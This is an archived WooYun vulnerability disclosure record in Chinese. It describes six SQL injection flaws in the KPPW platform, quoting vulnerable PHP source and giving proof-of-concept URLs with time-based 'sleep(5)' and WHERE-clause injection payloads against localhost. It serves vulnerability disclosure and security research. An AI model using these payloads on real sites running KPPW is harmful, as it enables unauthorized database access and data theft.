{"id": 32568, "wybug_id": "wooyun-2015-0110870", "wybug_title": "KPPW最新版 6处注入", "wybug_corp": "keke.com", "wybug_author": "路人曱", "wybug_date": "2015-05-05 10:35", "wybug_open_date": "2015-08-08 10:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向公众公开  简要描述： 洞太多啦 详细说明：  KPPW 最新版20150327第一处注入：漏洞文件:/control/tasklist.php\n$m = intval($m);$i = intval($i);$s = intval($s);$r = intval($r);$o = intval($o);$pd = intval($pd);\n\n$m and $strUrl .=\"&m=\".$m;$s and $strUrl .=\"&s=\".$s;$r and $strUrl .=\"&r=\".$r;$i and $strUrl .=\"&i=\".$i;$pd and $strUrl .=\"&pd=\".$pd;$o and $strUrl .=\"&o=\".$o;$p and $strUrl .=\"&p=\".intval($p);$ky and  $strUrl .=\"&ky=\".$ky;\n2处代码未对$p 参数进行intval\nif (intval ( $p )) {\t$strWhere .= \" and a.province = \".intval($p);\t$two=db_factory::get_table_data(\"*\",\"witkey_district\",\"upid=\".$p);}\nintval判断 轻松绕过造成注入证明：http://127.0.0.1/kppw0327/index.php?do=tasklist&m=2&s=2&r=2&o=5&p=1 || sleep(5)\n\n第二处注入:/control/goodslist.php\n$m and $strUrl .=\"&m=\".intval($m);$intPage and $strUrl .=\"&intPage=\".intval($intPage);$i and $strUrl .=\"&i=\".intval($i);$pd and $strUrl .=\"&pd=\".intval($pd);$o and $strUrl .=\"&o=\".strval($o);$p and $strUrl .=\"&p=\".intval($p);$ky and  $strUrl .=\"&ky=\".$ky;\n$p参数依然没intval\nif (intval ( $p )) {\t$strWhere .= \" and a.province = \".intval($p);\t$two=db_factory::get_table_data(\"*\",\"witkey_district\",\"upid=\".$p);}\n同样造成注入证明：http://127.0.0.1/kppw0327/index.php?do=goodslist&m=2&s=2&r=2&o=5&p=1 || 1=sleep(5)\n\n第三处注入:漏洞文件同上\nif (intval ( $twoid )) {\t$arrCitytwo =  CommonClass::getDistrictById($twoid);\t$strWhere .= \" and a.city = \".intval($twoid);\t$three=db_factory::get_table_data(\"*\",\"witkey_district\",\"upid=\".$twoid);\t$twoid and $strUrl .=\"&twoid=\".intval($twoid);}\n类似一样的证明：http://127.0.0.1/kppw0327/index.php?do=goodslist&m=7&m=0&twoid=1xxx\n\n   漏洞证明：  第四处:漏洞文件:/control/ajax/balance.php\n$id=intval($id);$orderId=intval($orderId);$arrMemer=db_factory::get_one(\"select * from \".TABLEPRE.\"witkey_member where uid=\".$gUid);$twoPassword = keke_user_class::get_password ( $arrMemer['password'], $arrMemer['rand_code'] ); if (isset($formhash)&&kekezu::submitcheck($formhash)) { \t$sec_code=kekezu::escape(trim($zfpwd)); \t$strMd5Pwd = keke_user_class::get_password ( $sec_code, $gUserInfo ['rand_code'] ); \t$arrUserInfo=db_factory::get_one(sprintf(\"select * from %switkey_space where uid=%d and sec_code='%s'\",TABLEPRE,intval($gUid),$strMd5Pwd)); \tswitch ($type){ \t\tcase 'task': \t\t\t$fina_type=\"pub_\".$type; \t\t\t$tips='你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl='index.php?do=task&id='.intval($id); \t\t\t$strwzfUrl='index.php?do=yepay&type='.$type.'&id='.intval($id); \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_finance where obj_id=\".intval($id).\" and fina_action='.$fina_type.'\"; \t\t\tbreak; \t\tcase 'goods': \t\t\t$fina_type=\"buy_service\"; \t\t\t$tips='你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl='index.php?do=goods&id='.intval($id); \t\t\t$strwzfUrl='index.php?do=order&sid='.$id.'&step=step2&orderId='.$orderId.'&action=confirm_pay'; \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_finance where order_id=\".intval($orderId).\" and fina_action='.$fina_type.'\"; \t\t\tbreak;\t \t\tcase 'service': \t\t\t$fina_type=\"buy_service\"; \t\t\t$tips='你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl='index.php?do=goods&id='.intval($id); \t\t\t$strwzfUrl='index.php?do=order&sid='.$id.'&step=step3&orderId='.$orderId.'&action=pay'; \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_finance where order_id=\".intval($orderId).\" and fina_action='.$fina_type.'\"; \t\t\tbreak; \t\tcase 'pubservice': \t\t\t$tips='你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl='index.php?do=goods&id='.intval($id); \t\t\t$strwzfUrl='index.php?do=yepay&type=service&id='.intval($id).\"&orderId=\".$orderId; \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_order where order_id=\".intval($orderId).\" and order_status='ok'\"; \t\t\tbreak;\t\t \t\tcase 'gy': \t\t\t$fina_type=\"buy_gy\"; \t\t\t$tips['errors']['zfpwd'] = '你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl=NULL; \t\t\t$strwzfUrl='index.php?do=gy&id='.$id.'&step=step3&orderId='.$orderId.'&action=pay'; \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_order where order_id=\".intval($orderId).\" and order_status='ok'\"; \t\t\tbreak; \t\tcase 'taskCash': \t\t\t$fina_type=\"hosted_reward\"; \t\t\t$tips='你已经支付成功了，不需要再次支付！'; \t\t\t$stryzfUrl='index.php?do=task&id='.intval($id); \t\t\t$strwzfUrl=\"index.php?do=taskhandle&op=consign&taskId=\".$id; \t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_finance where obj_id=\".intval($id).\" and fina_action='.$fina_type.'\"; \t\t\tbreak;\t \t} \tif($arrUserInfo && $type){ \t\t$arrFinance=db_factory::get_one($strSql); \t\tif($arrFinance){ \t\t\tkekezu::show_msg($tips,$stryzfUrl,'','','success');\n还是先看下kppw的参数获取方式\n$_R = $_REQUEST;$_R = kekezu::k_input ( $_R );$_GET   = kekezu::k_input($_GET);$_POST  = kekezu::k_input($_POST);$_R and extract ( $_R, EXTR_SKIP );\n可以看到$strSql是在每个case中赋值的 如果我们$type=xxx进入switch却又进入不了每个case那么可以自己传入$strSql参数\n$arrFinance=db_factory::get_one($strSql);\n在这里进入查询 证明：此处需注册个账号 支付密码也得填你自己真正的支付密码 即可\n\n第五处注入:漏洞文件：/control/ajax/banner.php\nif($_R['a']==1){\t$arr['shop_background']=\"\";\tdb_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);\tkekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}elseif($_R['a']==2){    $arr['banner']=\"\";    db_factory::updatetable(TABLEPRE.\"witkey_shop\", $arr, \"uid=\".$_R['id']);    kekezu::show_msg('已清除','index.php?do=seller&id='.intval($id),NULL,NULL,'ok');}\na 为1或2 都行$_R['id'] 直接放入查询证明:http://127.0.0.1/kppw0327/index.php?do=ajax&view=banner&a=1&id=1xxxx\n\n第六处注入:漏洞文件:/control/articlelist.php\n<?php defined ( 'IN_KEKE' ) or exit ( 'Access Denied' );$strNavActive = 'articlelist';$strUrl = $_K['siteurl'].\"/index.php?do=articlelist\";$catid and $strUrl .=\"&catid=\".intval($catid);$intPage and $strUrl .=\"&intPage=\".$intPage;$arrArtCats = kekezu::get_table_data ( \"*\", \"witkey_article_category\", \"cat_type='article' and art_cat_pid=1\", \"listorder asc\", \"\", \"\", \"\", null );$page and $intPage = intval($page);$intPage = intval ( $intPage ) ? $intPage : 1;$intPagesize = intval ( $intPagesize ) ? $intPagesize : 20;intval($catid) and $intCatid = intval($catid) or $intCatid = intval($arrArtCats['0']['art_cat_id']);$intCatid and $strWhere .= \" and a.art_cat_id = $intCatid\";$strWhere.=\" and a.is_show!=2\";$strWhere .=\" order by is_recommend desc,a.listorder asc,pub_time desc\";$strSql = \"select a.* ,b.cat_name from \" . TABLEPRE . \"witkey_article a left join \" . TABLEPRE . \"witkey_article_category b on a.art_cat_id=b.art_cat_id where b.cat_type='article'  $strWhere\";\n$strWhere第一次出现都是 $strWhere .= 来添加  未见到定义 那么可以直接传入初始值 后面都是 .= 添加 无影响证明：http://127.0.0.1/kppw0327/index.php?do=articlelist&strWhere=%20and%201=1%23\n\n   修复方案：  漏洞应该还有很多 仔细检查下   版权声明：转载请注明来源 路人曱@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-08 10:37 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}